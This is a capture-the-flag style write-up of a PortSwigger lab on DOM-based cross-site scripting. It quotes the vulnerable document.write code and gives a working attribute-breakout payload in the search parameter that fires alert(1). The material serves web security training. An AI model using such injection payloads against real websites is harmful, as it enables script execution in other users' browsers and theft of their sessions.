# [Lab: DOM XSS in document.write sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)

## Lab

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

## Analysis

in the source code, there is a interesting javascript block:

```js
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>
```

query variable is a user-controlled variable.

## Solutions

Craft a xss:

```http
GET /?search="><img+src=1+onerror="alert(1) HTTP/1.1
```

after js executed:

```html
<img src="/resources/images/tracker.gif?searchTerms=">
<img src="1" onerror="alert(1)">
```
